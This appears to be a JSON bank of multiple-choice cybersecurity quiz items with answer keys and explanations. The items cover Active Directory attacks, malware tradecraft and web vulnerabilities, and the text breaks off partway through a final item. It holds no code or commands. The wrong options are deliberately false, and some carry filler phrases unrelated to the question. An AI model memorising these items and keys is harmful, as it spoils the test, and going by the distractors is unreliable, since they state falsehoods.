    "question": "What does a Kerberoasting attack mainly try to obtain in an Active Directory environment?",
    "options": [
      "Cleartext VPN pre-shared keys from the DHCP options field by spoofing a rogue helper-address on every access VLAN in the campus",
      "Offline-crackable service account password material by requesting service tickets for SPNs and extracting ticket hashes",
      "A permanent golden certificate for MDM enrollment by replaying WPA3 SAE handshakes captured only on the guest Wi-Fi SSID segment",
      "Root SSH private keys from network devices by forcing all BGP sessions to fall back to TCP-AO with an intentionally empty keychain"
    ],
    "correct": 1,
    "explanation": "Kerberoasting requests Kerberos service tickets (TGS) for accounts with SPNs, extracts the encrypted material, and cracks it offline to recover service-account passwords—often highly privileged. It is not about DHCP helper spoofing for VPN PSKs, WPA3 SAE golden MDM certs, or emptying BGP TCP-AO keychains for SSH roots.",
    "difficulty": "Hard"
  },
  {
    "question": "What does an NTLM relay attack mainly try to abuse in a Windows environment?",
    "options": [
      "It cracks Kerberos TGTs offline by capturing AS-REP responses only from accounts that have Kerberos pre-authentication explicitly disabled in the domain",
      "It captures a victim’s NTLM authentication attempt and relays it to another service so the attacker can authenticate as that user without knowing the password",
      "It floods RADIUS with forged EAP-TLS client certificates until the NPS server revokes every machine account and computer object stored in Active Directory today",
      "It only turns off SMB signing on the attacker’s own laptop so local disk images open slightly faster during routine forensic acquisition of spare drives"
    ],
    "correct": 1,
    "explanation": "NTLM relay intercepts a legitimate NTLM authentication and reuses it against a different target (often when signing or channel-binding protections are weak). It is not AS-REP roasting, not EAP-TLS flooding of RADIUS, and not a local SMB performance tweak.",
    "difficulty": "Hard"
  },
  {
    "question": "How does password spraying mainly differ from a classic online brute-force attack against one account?",
    "options": [
      "Spraying only works against SSH public keys and never against web portals, VPN gateways, or other login forms that still accept ordinary user passwords",
      "Spraying requires physical console access to the domain controller so every guessed password can be written directly into the NTDS.dit database file on disk",
      "Spraying tries a small set of common passwords across many accounts to avoid lockouts, while classic brute force hammers many passwords against one target account",
      "There is no real difference: both names describe the same Kerberoasting workflow that requests service tickets and cracks their hashes completely offline afterward"
    ],
    "correct": 2,
    "explanation": "Password spraying spreads a few likely passwords across many users to stay under account-lockout thresholds; classic online brute force focuses many guesses on one account. It is not limited to SSH keys, does not need DC console access, and is not Kerberoasting.",
    "difficulty": "Medium"
  },
  {
    "question": "In Active Directory attacks, what does a successful DCSync mainly allow an adversary to do?",
    "options": [
      "Abuse domain-controller replication rights to pull password hashes (for example via DRSUAPI) from AD without executing payload code on the DC’s interactive console",
      "Replace every Group Policy administrative template with a malicious MSI so all workstations install unwanted software during the next mandatory reboot maintenance window",
      "Disable Kerberos authentication for the entire forest and force every interactive and network logon to use only NTLMv1 with no fallback to newer protocols",
      "Rewrite all user SPNs into public DNS CNAME records so ticket-granting tickets are resolved only through external recursive resolvers on the Internet"
    ],
    "correct": 0,
    "explanation": "DCSync abuses directory replication privileges (often after stealing high-privilege credentials) to request account secrets/hashes as if the attacker were a DC. It is not about swapping GPO MSI packages, turning off Kerberos forest-wide, or rewriting SPNs into public DNS CNAMEs.",
    "difficulty": "Hard"
  },
  {
    "question": "In malware analysis, what does “sandbox detonation” mainly mean?",
    "options": [
      "Wiping the production domain controller overnight so every suspicious binary is forced to reinstall itself from a USB stick on the next reboot of every joined workstation",
      "Disabling all EDR sensors for 24 hours so analysts can copy malware hashes directly into the live Active Directory schema and Group Policy templates",
      "Running a suspicious file in an isolated virtual environment to observe behavior (network, file, registry) without infecting production hosts",
      "Publishing the full sample to a public paste site so every SOC worldwide can recompile the binary before any local static or dynamic analysis starts"
    ],
    "correct": 2,
    "explanation": "Sandbox detonation executes a suspect sample in a controlled isolated environment to capture behavioral indicators safely. It is not wiping DCs, disabling EDR to touch AD schema, or dumping samples to public paste sites as the definition.",
    "difficulty": "Medium"
  },
  {
    "question": "In Active Directory attacks, how does a Golden Ticket mainly differ from a Silver Ticket?",
    "options": [
      "A Golden Ticket is only valid on Linux workstations joined via Samba, while a Silver Ticket works exclusively on Azure AD cloud-only tenants without any on-premises domain controller present",
      "A Golden Ticket forges a TGT with the KRBTGT hash for broad service-ticket requests; a Silver Ticket forges a TGS for one service using that service account’s hash",
      "Both tickets are identical JWT tokens issued by Entra ID Conditional Access policies and never involve Kerberos keys stored on on-premises domain controllers at all",
      "A Silver Ticket always requires DCSync rights first on a DC, whereas a Golden Ticket can be minted from any local guest account without domain credentials or KRBTGT material"
    ],
    "correct": 1,
    "explanation": "Golden Tickets forge TGTs with the KRBTGT hash (broad access to request service tickets). Silver Tickets forge a TGS for one service using that service’s account hash. They are Kerberos constructs, not Linux-only/Azure-only JWT rules, and Silver does not uniquely require DCSync first.",
    "difficulty": "Hard"
  },
  {
    "question": "In network detection, what does malware “beaconing” to a C2 (command-and-control) server typically look like?",
    "options": [
      "A single burst of random UDP noise that never repeats and only appears during the first DHCP Discover after a cold boot of the endpoint on the access VLAN",
      "Continuous full-mesh OSPF flooding between every workstation so the C2 can rewrite the campus IGP topology and area types in real time across all sites",
      "Encrypted emails sent only to the local mail gateway that contain no callbacks and never open outbound connections to any external host or resolver",
      "Periodic, often low-and-slow outbound connections or DNS queries from an implant back to attacker infrastructure to check in and receive commands"
    ],
    "correct": 3,
    "explanation": "Beaconing is repeated check-ins from malware to C2 (HTTP/DNS/etc.), often periodic and stealthy. It is not a one-shot DHCP UDP burst, OSPF mesh rewriting, or email-only traffic with no outbound callbacks.",
    "difficulty": "Medium"
  },
  {
    "question": "What does AS-REP roasting mainly abuse in Active Directory Kerberos environments?",
    "options": [
      "It floods RADIUS with EAP-TLS handshakes until every wireless controller forgets its AAA servers and falls back to open SSIDs across the entire campus fabric",
      "It rewrites BGP communities on all PE routers overnight so return traffic prefers a malicious ISP peer that advertises only a default route into the enterprise",
      "It empties every DHCP pool by spoofing Discover storms with random MACs so clients receive only APIPA addresses and never learn the domain DNS servers",
      "It requests AS-REP messages for accounts that do not require Kerberos pre-authentication, then cracks the encrypted material offline to recover those passwords"
    ],
    "correct": 3,
    "explanation": "AS-REP roasting targets accounts with Kerberos pre-authentication disabled: the attacker obtains AS-REP ciphertext and cracks it offline for the account password. It is not a RADIUS/EAP-TLS flood, BGP community rewrite, or DHCP starvation technique.",
    "difficulty": "Medium"
  },
  {
    "question": "In Kerberos-based attacks, what does Pass-the-Ticket (PtT) mainly involve?",
    "options": [
      "Cracking NTLM challenge-response pairs captured only from LLMNR/NBT-NS spoofing on the LAN, without ever reading or injecting a Kerberos ticket from any cache",
      "Sending phishing SMS one-time codes that expire in thirty seconds so MFA fatigue forces every user to approve a rogue push notification on their phone",
      "Reusing a stolen Kerberos ticket (TGT or service ticket) from memory or disk to authenticate as that principal without knowing the account password",
      "Brute-forcing WPA3 SAE handshakes offline for days to mint a permanent MDM enrollment certificate that works only on guest SSIDs and never on corporate SSIDs"
    ],
    "correct": 2,
    "explanation": "Pass-the-Ticket reuses a stolen Kerberos ticket (often from LSASS/ticket cache) to authenticate without the cleartext password. It is distinct from NTLM hash cracking via LLMNR spoofing, MFA-fatigue phishing, or WPA3 SAE cracking.",
    "difficulty": "Medium"
  },
  {
    "question": "Why do attackers often dump credentials from the LSASS process on a Windows host?",
    "options": [
      "LSASS only stores printer spooler queue names and driver paths, so dumping it is required before any lateral movement over SMB can begin on the corporate LAN segment",
      "LSASS holds authentication material (e.g., NTLM hashes, Kerberos tickets, sometimes cleartext) that can enable Pass-the-Hash, Pass-the-Ticket, or further domain pivots",
      "LSASS is the only place Group Policy stores Wi-Fi PSKs for every SSID, and dumping it replaces the need for any domain credentials when joining cloud-only Azure AD tenants",
      "LSASS encrypts the local BIOS firmware image each boot, so dumping it is the only supported way to unlock BitLocker recovery keys from the TPM PCR banks on that host"
    ],
    "correct": 1,
    "explanation": "LSASS (Local Security Authority Subsystem Service) caches logon secrets such as NTLM hashes and Kerberos tickets; dumping it fuels PtH/PtT and lateral movement. It is not a printer-queue store, not the sole GPO Wi-Fi PSK vault for Azure join, and not a BIOS/BitLocker TPM unlock ritual.",
    "difficulty": "Medium"
  },
  {
    "question": "What characterizes fileless malware in endpoint attacks?",
    "options": [
      "It runs mainly in memory or via trusted built-in tools/scripts (e.g., PowerShell, WMI) with little or no traditional malicious EXE written to disk, making file-based AV scans less effective",
      "It can only infect air-gapped printers that lack any CPU, RAM, or network stack, and it always stores a full PE binary under C:\\Windows\\System32 before every execution, regardless of any vendor-specific default on the platform.",
      "It is defined as any USB autorun worm that requires the victim to double-click a .exe on a mapped network drive and never uses living-off-the-land binaries or in-memory techniques in typical campus and enterprise production networks alike.",
      "It exclusively encrypts disk partitions with a public ransomware note and never abuses scripting hosts, registry-resident payloads, or reflective DLL injection in memory across common IOS, IOS-XE, and NX-OS deployment models."
    ],
    "correct": 0,
    "explanation": "Fileless malware favors memory-resident or living-off-the-land execution (PowerShell/WMI/etc.) so classic on-disk signature scanning struggles. It is not limited to air-gapped printers, not defined as USB-only EXE worms, and not synonymous with ransomware-only disk encryption.",
    "difficulty": "Medium"
  },
  {
    "question": "In cyber threat scenarios, what does island hopping typically describe?",
    "options": [
      "Physically moving hard drives between two air-gapped data centers over a courier route that never uses the Internet or any managed service provider network, regardless of any vendor-specific default on the platform.",
      "Compromising a weaker connected organization (often a supplier/MSP/partner) and then pivoting from that trusted relationship into the primary target’s environment",
      "Jumping VLANs only by forging 802.1Q tags on a local switch port without ever phishing, exploiting, or abusing any third-party trust path outside the LAN in typical campus and enterprise production networks alike.",
      "Rotating C2 domains every millisecond with a cryptographic one-time pad so that DNS resolvers and TLS SNI inspection become permanently impossible on every path"
    ],
    "correct": 1,
    "explanation": "Island hopping abuses trust in a connected third party (supplier/MSP/partner): breach the weaker island, then pivot into the real target. It is not courier air-gap disk moves, not pure local VLAN hopping, and not a definition of ultra-fast C2 domain rotation.",
    "difficulty": "Medium"
  },
  {
    "question": "How do Domain Generation Algorithms (DGAs) commonly help malware maintain command-and-control reachability?",
    "options": [
      "They permanently pin a single hard-coded IP in the binary so defenders only ever need to block one address for the lifetime of the campaign with no DNS involvement, regardless of any vendor-specific default on the platform.",
      "They replace every DNS query with static /etc/hosts entries distributed by USB so the malware never contacts a resolver and cannot be observed in passive DNS telemetry in typical campus and enterprise production networks alike.",
      "They algorithmically generate many candidate domain names over time; the operator registers one (or a few) in that set so infected hosts can still find C2 even after individual domains are blocked",
      "They encrypt the entire OSPF LSDB inside TXT records so routers treat botnet traffic as Type-5 externals and never allow security teams to sinkhole any generated name across common IOS, IOS-XE, and NX-OS deployment models."
    ],
    "correct": 2,
    "explanation": "DGAs produce many possible domain names; attackers register the ones they need so malware can rediscover C2 after takedowns. They are not single hard-coded IPs, not USB /etc/hosts-only, and not OSPF LSDB-in-TXT tricks.",
    "difficulty": "Medium"
  },
  {
    "question": "What is server-side request forgery (SSRF)?",
    "options": [
      "An attack where a script injected into a web page runs in other users' browsers and steals their session cookies while they view the page",
      "An attack where a victim's browser is tricked into sending an authenticated request to a site they are logged into, such as changing a password",
      "An attack where the attacker makes a vulnerable server send requests to targets of their choice, such as internal services or cloud metadata endpoints",
      "An attack where the attacker floods a web server with half-open TCP connections until its connection table is completely full and new users cannot connect"
    ],
    "correct": 2,
    "explanation": "In SSRF the server itself is abused as a proxy, often to reach internal-only systems or cloud metadata (e.g., 169.254.169.254) and steal credentials. Option 1 describes XSS, option 2 CSRF (client-side forgery), and option 4 a SYN flood.",
    "difficulty": "Medium"
  },
  {
    "question": "How does domain fronting help malware hide its command-and-control (C2) traffic?",
    "options": [
      "It registers thousands of random domains every day so that the defenders cannot block all of them before the malware finds one that the operator controls",
      "It rewrites the DNS records of the victim's own domain so that internal users are redirected to a cloned login page that is hosted by the attacker",
      "It hides C2 commands inside ICMP echo payloads so that firewalls that only inspect TCP and UDP traffic never see the attacker's instructions at all",
      "It shows a reputable CDN-hosted domain in DNS and the TLS SNI, while the HTTP Host header inside the encrypted session points to the attacker's backend"
    ],
    "correct": 3,
    "explanation": "Domain fronting abuses CDNs: the visible layers (DNS, SNI) name a trusted domain, but the inner Host header routes the request to the attacker's service on the same CDN, so blocking it means blocking the popular domain. Option 1 is DGA, option 2 DNS hijacking/pharming, and option 3 ICMP tunneling.",
    "difficulty": "Hard"
  },
  {
    "question": "During incident response, which evidence should normally be collected first according to the order of volatility?",
    "options": [
      "CPU registers, cache and RAM contents, along with running processes and live network connections, because they are lost at shutdown",
      "Archived backup tapes stored offsite, because they are the oldest copies of the data and are the most likely to be overwritten first",
      "The full hard disk image of the affected host, because disk data disappears as soon as the incident responder opens the case ticket",
      "Printed logs and physical documents in the office, because paper evidence degrades faster than any data held in the system memory"
    ],
    "correct": 0,
    "explanation": "The order of volatility says to capture the most short-lived data first: registers, cache, RAM, process and network state, then temporary files, disk, remote logs and finally archival media. Backups and disk images are far less volatile than memory.",
    "difficulty": "Medium"
  },
  {
    "question": "An attacker loads a bank's transfer page inside an invisible iframe on a game site and tricks users into clicking a hidden Confirm button. What is this attack and a standard defense?",
    "options": [
      "Clickjacking; the bank should send X-Frame-Options DENY or CSP frame-ancestors so browsers refuse to render its pages in frames",
      "Cross-site scripting; the bank should hash every password with bcrypt so injected scripts can no longer read the stored credentials",
      "SQL injection; the bank should use parameterized queries so the hidden button cannot change the SQL statement sent to its database",
      "DNS spoofing; the bank should enable DNSSEC on its zone so the game site can no longer resolve the bank's domain to a rogue server"
    ],
    "correct": 0,
    "explanation": "Clickjacking (UI redressing) overlays a framed legitimate page under a decoy so the victim clicks real buttons. The fix is to forbid framing with X-Frame-Options or Content-Security-Policy frame-ancestors. No script is injected, no SQL is altered and DNS resolution is untouched.",
    "difficulty": "Medium"
  },
  {
    "question": "A malicious site's domain first resolves to the attacker's server with a very short TTL, then re-resolves to 192.168.1.1, letting the victim's browser send requests to the home router's admin page. What is this technique?",
    "options": [
      "DNS cache poisoning, because the attacker injects forged answers into the ISP resolver so every user of that resolver is redirected to the router",
      "Domain generation algorithm (DGA), because the malware creates thousands of random domains per day so defenders cannot block its servers",
      "DNS rebinding, because the same origin is rebound to an internal IP, so the browser's same-origin policy lets the attacker's script reach it",
      "DNS tunneling, because the attacker encodes stolen data in long subdomain labels and exfiltrates it through normal recursive DNS queries"
    ],
    "correct": 2,
    "explanation": "DNS rebinding abuses short TTLs: the hostname (same origin) is switched to a private IP, so the attacker's JavaScript can talk to internal devices. Defenses include resolvers blocking private answers for public names, Host-header checks and authentication on internal services. Cache poisoning forges resolver data, DGA is for C2 resilience and tunneling is for exfiltration.",
    "difficulty": "Hard"
  },
  {
    "question": "A company's build server pulls an internal package named acme-utils. An attacker publishes acme-utils version 99.0 on the public npm registry, and the build installs it. What is this attack and a key mitigation?",
    "options": [
      "Typosquatting; developers should be trained to spell package names carefully, because the attack only works when a name is mistyped",
      "Dependency confusion; use scoped or namespaced packages and point the build at a private registry with pinned versions and lockfiles",
      "Watering hole attack; block the npm website on the corporate proxy, since the package is only delivered to users browsing the registry",
      "Man-in-the-browser; install an anti-malware extension on build agents, because the malicious code is injected into the browser session"
    ],
    "correct": 1,
    "explanation": "Dependency confusion exploits package managers that prefer the highest version across public and private sources. Scopes/namespaces, a single private registry (proxying public), version pinning and lockfiles prevent it. Typosquatting relies on misspelled names, a watering hole compromises a site victims visit, and man-in-the-browser is browser-session malware.",
    "difficulty": "Medium"
  },
  {
    "question": "A logged-in user changes the URL /api/invoices/1043 to /api/invoices/1044 and sees another customer's invoice. Which vulnerability is this?",
    "options": [
      "Cross-site request forgery (CSRF), because the browser sends the session cookie with a request that the user never meant to send",
      "Directory traversal, because the number in the path lets the user climb out of the web root and read files from the server disk",
      "Insecure direct object reference (IDOR), a broken access control flaw where the server does not check who owns the record",
      "Session fixation, because the attacker set the session ID before login and can now reuse it to read the other customer's data"
    ],
    "correct": 2,
    "explanation": "IDOR (part of OWASP Broken Access Control) happens when the app trusts an object ID from the client without checking that the logged-in user may access it. The fix is a server-side authorization check on every object (random IDs alone are not enough). CSRF forges requests from the victim's browser, traversal uses ../ to reach files and session fixation reuses a pre-set session ID.",
    "difficulty": "Medium"
  },
  {
    "question": "Users with push-notification MFA are phished through a reverse proxy that shows the real Microsoft 365 login page. The attacker then signs in without any MFA prompt. What happened, and what resists it best?",
    "options": [
      "Adversary-in-the-middle phishing stole the session cookie after MFA; phishing-resistant FIDO2/passkeys bound to the origin stop it",
      "MFA fatigue flooded users with push prompts until one was approved; number matching on the prompts is enough to stop this reverse proxy",
      "SIM swapping moved the users' phone numbers to the attacker; switching from SMS codes to push notifications fully blocks the attack",
      "Password spraying guessed common passwords; a longer lockout threshold on accounts prevents the attacker from reusing the session"
    ],
    "correct": 0,
    "explanation": "AiTM kits (e.g. Evilginx) relay the real login, so the victim completes MFA and the proxy captures the session cookie, which the attacker replays. FIDO2/passkeys are bound to the real domain and will not sign for the proxy's domain; conditional access and token binding also help. MFA fatigue needs repeated prompts, SIM swapping targets SMS and spraying only guesses passwords.",
    "difficulty": "Hard"
  },
  {
    "question": "An employee clicks a link and approves an app called 'PDF Viewer' that asks for Mail.Read and offline_access in Microsoft 365. Later, mail is read even after the employee's password is reset. What is this?",
    "options": [
      "Credential stuffing, because the attacker reused a leaked password from another site and a password reset does not end it",
      "Cookie theft by malware, because the infostealer copied browser cookies that stay valid for the mailbox after a reset",
      "Typosquatting, because the employee went to a lookalike domain and the fake site keeps reading mail through webmail",
      "Illicit consent grant (OAuth consent phishing); the app holds its own refresh token, so the consent must be revoked"
    ],
    "correct": 3,
    "explanation": "In consent phishing the attacker never needs the password: the user grants a malicious OAuth app delegated permissions, and offline_access gives it a refresh token that survives a password reset. Fix it by revoking the app's consent and tokens and restricting user consent to verified publishers or admin approval. Credential stuffing and stolen cookies are cut off by a reset with session revocation, and typosquatting is just a lookalike domain.",
    "difficulty": "Medium"
  },
  {
    "question": "A login form builds SQL with string concatenation from the username field. Which defense best stops classic SQL injection here?",
    "options": [
      "Rely on a WAF signature set alone, because modern WAFs rewrite every query before it reaches the database engine",
      "Hash the username with SHA-256 before concatenation, so injected quotes become hex and cannot close the string",
      "Switch the column to a numeric ID only and keep concatenating, because numbers cannot carry SQL metacharacters",
      "Use parameterized queries (prepared statements) so user input is bound as data and never parsed as SQL code"
    ],
    "correct": 3,
    "explanation": "Parameterized queries / prepared statements separate the SQL statement from bound values, so input cannot change the query structure. WAFs help as defense-in-depth but miss novel payloads; hashing the username still leaves a concatenated query; numeric casting helps one field but is not a general fix and error-based tricks can remain.",
    "difficulty": "Medium"
  },
  {
    "question": "On Windows, a service ImagePath is C:\\Program Files\\Vendor App\\service.exe without quotes, and Authenticated Users can write to C:\\Program Files\\Vendor App\\. How can a local attacker escalate to the service account?",
    "options": [
      "Replace the system-wide PATH so cmd.exe runs first, because Windows always searches PATH before ImagePath folder entries on disk",
      "Plant malware earlier on the unquoted path (e.g. C:\\Program.exe) so the Service Control Manager launches it",
      "Enable SeDebugPrivilege via whoami /priv and dump LSASS, which is required before any unquoted ImagePath can be abused",
      "Clear the service's DependOnService list so Windows reinstalls the binary from an attacker-controlled UNC path at boot"
    ],
    "correct": 1,
    "explanation": "Unquoted service paths with spaces make the Service Control Manager try C:\\Program.exe, then C:\\Program Files\\Vendor.exe, then the real path. Write permission in an earlier folder lets an attacker drop a binary the SCM runs as the service identity (often LocalSystem). PATH hijacking is a different issue; SeDebug/LSASS dump is another technique; DependOnService does not reinstall from UNC that way.",
    "difficulty": "Hard"
  },
  {
    "question": "Which statement best distinguishes stored XSS from reflected XSS in a typical web application?",
    "options": [
      "Stored XSS only works over cleartext HTTP, while reflected XSS requires HTTPS plus a valid client certificate before any script can run in the browser",
      "Stored XSS keeps the script in server data for later viewers; reflected XSS echoes the payload only in that immediate response",
      "Stored XSS modifies only DNS records on the resolver, while reflected XSS rewrites ARP caches on the victim’s access switch",
      "Stored XSS needs a malicious browser extension, while reflected XSS needs only a crafted email with no link the user opens"
    ],
    "correct": 1,
    "explanation": "Stored (persistent) XSS saves the payload in an application store (comment, profile, ticket) so other users later receive and execute it. Reflected XSS takes the payload from the request and reflects it in that response (often via a malicious URL). Transport HTTP/HTTPS and client certs do not define the difference; neither XSS type is about DNS/ARP poisoning; extensions are unrelated to the classic classification.",
    "difficulty": "Medium"
  },
  {
    "question": "A banking site relies on session cookies for authenticated POSTs. Which defense best stops classic CSRF on a state-changing transfer?",
    "options": [
      "Disable TLS on the transfer endpoint so browsers refuse to send cookies on cross-site POSTs that lack an HTTPS URL",
      "Hash the account number with MD5 in the JSON body, because CSRF tooling cannot forge that digest without the bank’s offline HSM private key material",
      "Require a per-session anti-CSRF token (or SameSite=Strict cookies) so forged cross-site POSTs lack the expected secret",
      "Open CORS with Access-Control-Allow-Origin * so the browser blocks credentialed cross-origin POSTs automatically"
    ],
    "correct": 2,
    "explanation": "Classic CSRF uses the browser’s automatic cookie send on a forged cross-site request. Synchronizer/anti-CSRF tokens (or strict SameSite cookies) ensure the forged request lacks a secret only the legitimate app page can read. Disabling TLS does not stop cookie sends; MD5 of a public account number is not a CSRF secret; ACAO * does not block credentialed CSRF and is the opposite of a tight CORS policy.",
    "difficulty": "Hard"
  },
  {
    "question": "Why is UEFI Secure Boot (or Measured Boot with TPM attestations) still useful even when the disk is fully encrypted with BitLocker-class FDE?",
    "options": [
      "It protects boot-chain integrity so malware cannot replace the bootloader/kernel before the OS unlocks the encrypted volume",
      "It replaces disk encryption entirely, because a validated bootloader already encrypts every file with the TPM endorsement key",
      "It stops all phishing of cloud admin accounts by binding each HTTPS session to the platform’s Secure Boot database hash",
      "It removes the need for OS patching, since only Microsoft-signed boot components can ever contain exploitable vulnerabilities"
    ],
    "correct": 0,
    "explanation": "Full disk encryption protects confidentiality of data at rest, but a compromised bootloader or kernel can run before/during unlock and subvert the OS. Secure Boot verifies signatures on boot components; Measured Boot/attestation records hashes in the TPM for remote verification. FDE is not replaced by Secure Boot; Secure Boot does not stop phishing; signed boot code still needs patching and does not imply the whole OS is bug-free.",
    "difficulty": "Medium"
  },
  {
    "question": "What does an XML External Entity (XXE) attack mainly abuse in a vulnerable parser?",
    "options": [
      "It floods the DNS resolver with random subdomains generated by a DGA so recursive queries exhaust resolver cache memory space",
      "It spoofs the victim’s MAC on the default gateway so ARP replies redirect HTTPS sessions into a local SSL strip proxy host",
      "It tricks the parser into resolving external entities, which can read local files or reach internal URLs from the server",
      "It replaces the UEFI bootloader signature database so Secure Boot accepts an unsigned kernel before BitLocker unlocks disk"
    ],
    "correct": 2,
    "explanation": "XXE abuses XML parsers that process external entity references. A crafted document can make the server fetch file:// resources or internal HTTP URLs (often overlapping with SSRF-like impact). It is not a DGA DNS flood, not ARP spoofing, and not a Secure Boot/bootloader attack.",
    "difficulty": "Medium"
  },
  {
    "question": "In Windows malware tradecraft, what does process hollowing mainly involve?",
    "options": [
      "Encrypting only the Master Boot Record with a ransomware note while leaving user files in plaintext NTFS clusters",
      "Starting a legitimate process suspended, unmapping its code, and injecting malicious code before it resumes",
      "Registering a rogue DHCP server that hands out an attacker DNS so browsers resolve banks to phishing sites",
      "Brute-forcing Kerberos AS-REP for users without pre-authentication to crack hashes offline without tickets"
    ],
    "correct": 1,
    "explanation": "Process hollowing creates a legitimate process in a suspended state, hollows out (unmaps) its memory image, injects attacker code, then resumes so the malicious payload runs under a trusted process name. It is not MBR-only ransomware, not rogue DHCP/DNS, and not AS-REP roasting (a Kerberos pre-auth weakness).",
    "difficulty": "Hard"
  },
  {
    "question": "What is Microsoft Sysmon mainly used for on Windows endpoints in a blue-team monitoring design?",
    "options": [
      "It replaces Windows Defender real-time scanning by signing every executable with a local self-signed code-signing certificate",
      "It is a full disk encryption feature that stores BitLocker recovery keys only in the TPM and never in Active Directory",
      "It is a VPN client that forces all corporate traffic through WireGuard tunnels before any process can open a socket",
      "It provides detailed process, network, and file-creation event logs that SIEM/EDR pipelines can use for detection"
    ],
    "correct": 3,
    "explanation": "Sysmon (System Monitor) is a Windows system service/driver that logs rich telemetry—process creates, network connections, file/registry changes, and more—into the Windows event log for SIEM or detection engineering. It does not replace Defender AV, is not BitLocker, and is not a VPN client.",
    "difficulty": "Medium"
  },
  {
    "question": "What does a typical WAF bypass attempt mainly try to achieve against a web application firewall?",
    "options": [
      "It floods the recursive DNS resolver with random DGA subdomains until cache memory is exhausted on every resolver node",
      "It crafts requests (encoding, alternate paths, verb tricks) so malicious payloads reach the app without matching WAF rules",
      "It spoofs the default-gateway MAC address so forged ARP replies redirect HTTPS sessions into a local SSL-strip proxy host",
      "It replaces the UEFI Secure Boot signature database so firmware accepts an unsigned bootloader before BitLocker unlocks disk"
    ],
    "correct": 1,
    "explanation": "WAF bypasses abuse gaps between what the WAF normalizes/matches and what the backend app accepts—encodings, path confusion, HTTP verb/content-type tricks, and similar. It is not a DGA DNS flood, ARP spoofing, or Secure Boot attack.",
    "difficulty": "Medium"
  },
  {
    "question": "In Windows tradecraft, what does DLL sideloading mainly involve?",
    "options": [
      "Encrypting only the Master Boot Record with a ransomware note while leaving all user files in plaintext NTFS clusters",
      "Registering a rogue DHCP server that hands out attacker-controlled DNS so browsers resolve banks to phishing landing pages",
      "Placing a malicious DLL where a trusted signed app will load it by search order, running attacker code in that process",
      "Brute-forcing Kerberos AS-REP for accounts without pre-authentication so hashes can be cracked offline without any tickets"
    ],
    "correct": 2,
    "explanation": "DLL sideloading abuses how Windows apps resolve DLL paths: an attacker drops a malicious DLL that a legitimate signed binary loads, often to blend into trusted processes and bypass simple application allow-lists. It is not MBR-only ransomware, rogue DHCP/DNS, or AS-REP roasting.",
    "difficulty": "Hard"
  },
  {
    "question": "In Active Directory, why is unconstrained Kerberos delegation considered especially dangerous if an attacker compromises that host?",
    "options": [
      "The host can reuse tickets of users who authenticate to it to impersonate them toward other services across the domain",
      "It disables Kerberos completely and forces every interactive logon to use plaintext LDAP simple binds on TCP port 389 only",
      "It converts all service accounts into Domain Admins automatically after the next Group Policy refresh interval completes",
      "It stores BitLocker recovery keys inside SYSVOL in cleartext so any Authenticated User can read them from the share"
    ],
    "correct": 0,
    "explanation": "With unconstrained delegation, a computer/service receives and can forward TGTs of users who connect to it, enabling impersonation to other services if the host is compromised. It does not disable Kerberos for LDAP binds, auto-promote service accounts to Domain Admin, or put BitLocker keys in SYSVOL.",
    "difficulty": "Medium"
  },
  {
    "question": "What does the PrintNightmare class of vulnerabilities mainly abuse in a Windows environment?",
    "options": [
      "It forges BGP communities on edge routers so every printer subnet is black-holed into Null0 before any spooler service can start at boot time",
      "It replaces UEFI Secure Boot keys so only unsigned printer firmware can load before BitLocker unlocks the system volume on that host",
      "It abuses the Windows Print Spooler so a remote or local attacker can run code as SYSTEM, often via malicious printer drivers",
      "It converts every Domain Controller into a print server that stores NTDS.dit inside the shared printers$ folder for anonymous SMB reads"
    ],
    "correct": 2,
    "explanation": "PrintNightmare-style issues abuse the Print Spooler (and related driver installation paths) to achieve remote/local code execution as SYSTEM. Mitigations include disabling the spooler where unused, restricting driver installation, and patching. It is not a BGP Null0 trick, Secure Boot key swap, or anonymous NTDS.dit share.",
    "difficulty": "Medium"
  },
  {
    "question": "In Active Directory Certificate Services (AD CS) abuse, what does the ESC1 technique mainly rely on?",
    "options": [
      "Stealing only the KRBTGT hash from a read-only Domain Controller backup tape so Silver Tickets can be forged with no certificate use at all afterward",
      "A misconfigured certificate template that lets low-privilege users enroll and supply an arbitrary SAN to authenticate as another user",
      "Forcing every workstation to trust a rogue DHCP option 252 WPAD entry so proxies intercept Kerberos AS-REQ messages on UDP port 88 only",
      "Disabling SMB signing domain-wide through a single GPO so NTLM relay to LDAP becomes the only remaining prerequisite still called ESC1"
    ],
    "correct": 1,
    "explanation": "ESC1 abuses overly permissive AD CS templates (e.g. client authentication EKU, enrollee-supplied SAN, Domain Users enrollment) so an attacker enrolls a certificate impersonating another principal and then uses it for authentication. It is not KRBTGT-only Silver Ticket theft, WPAD/DHCP 252 Kerberos interception, or SMB-signing GPO as the ESC1 core.",
    "difficulty": "Hard"
  },
  {
    "question": "How does RASP (Runtime Application Self-Protection) mainly differ from a traditional network or reverse-proxy WAF?",
    "options": [
      "RASP only inspects BGP flowspec rules on the edge firewall appliance, while a WAF only validates OSPF LSAs before they enter Area 0 of the core",
      "RASP replaces TLS entirely with cleartext HTTP inside the app container so the WAF can skip certificate pinning checks forever after every deploy",
      "RASP runs exclusively as an offline malware sandbox that detonates uploaded binaries once, while a WAF must sit inline on every packet along the forwarding path",
      "RASP instruments inside the running application to see real execution context, whereas a WAF typically filters HTTP at the edge without app internals"
    ],
    "correct": 3,
    "explanation": "RASP hooks or instruments the application runtime (libraries, interpreters, agents) so detections use real code paths, data flows, and users—context a perimeter WAF usually lacks. A WAF still filters at HTTP/edge policy layer. RASP is not BGP/OSPF inspection, not a TLS-removal feature, and not merely an offline sandbox.",
    "difficulty": "Medium"
  },
  {
    "question": "What is BloodHound mainly used for in Active Directory security assessments?",
    "options": [
      "It replaces every Domain Controller’s KRBTGT password twice per hour so Golden Tickets expire before an attacker can forge any TGT at all",
      "It acts as an inline WAF that blocks Kerberoasting TGS requests whenever an SPN belongs to a user account with a weak password hash",
      "It encrypts LSASS memory with a hypervisor enclave so tools like Mimikatz can never read NTLM hashes or Kerberos tickets from RAM",
      "It maps AD users, groups, computers, and ACLs as a graph to reveal attack paths such as paths to Domain Admin"
    ],
    "correct": 3,
    "explanation": "BloodHound (and collectors like SharpHound) enumerate AD relationships and ACLs into a graph so analysts/attackers can find privilege-escalation paths (e.g. to Domain Admin). It does not rotate KRBTGT on a schedule, act as a WAF for Kerberoasting, or encrypt LSASS by itself.",
    "difficulty": "Medium"
  },
  {
    "question": "In modern Active Directory abuse, what do Shadow Credentials mainly involve?",
    "options": [
      "Writing a malicious service principal name on krbtgt so every TGS request is forced into unconstrained delegation toward a rogue host",
